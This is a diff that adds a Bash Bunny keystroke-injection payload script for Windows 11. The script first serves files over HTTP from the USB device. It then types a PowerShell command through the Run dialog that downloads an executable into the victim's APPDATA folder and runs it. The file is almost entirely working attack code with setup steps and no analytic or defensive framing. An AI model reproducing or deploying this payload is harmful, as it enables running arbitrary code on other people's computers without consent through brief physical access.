@@ -1,1 +1,33 @@
-xxx
+# Title: UploadZIP
+# Description: Target downloads exe from BB http servern unzips and runs EXE
+# Author: Draco, Mochi
+# Target: Win11
+# Version: 1.1
+# Dependencies: gohttp
+# Category: Upload
+
+### Instructions
+# Put BB in switch one (payload should just be one line - ATTACKMODE RNDIS_ETHERNET)
+# ssh root@172.16.64.1 with creds (Follow forum instructions on how to share WiFi)
+# mkdir /home/<directory>
+# exit (out of ssh)
+# scp <payload> root@172.16.64.1:/home<directory>/<payload>
+
+ATTACKMODE HID RNDIS_ETHERNET
+
+# Switch to hosting directory, spin up http server
+LED STAGE1
+cd /home/draco
+gohttp -p 80 &
+
+# Open obfuscated cmd on target, downloads and runs payload (if successful). Exits cmd. 
+LED STAGE2
+Q GUI r
+QUACK DELAY 500
+QUACK STRING "powershell.exe -NoP -NonI -NoExit"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/peepee.exe\" -OutFile \"\$env:APPDATA\\peepee.exe\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 3; Start-Process \"\$env:APPDATA\\peepee.exe\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 3; exit }"
+QUACK ENTER
+
+LED FINISH
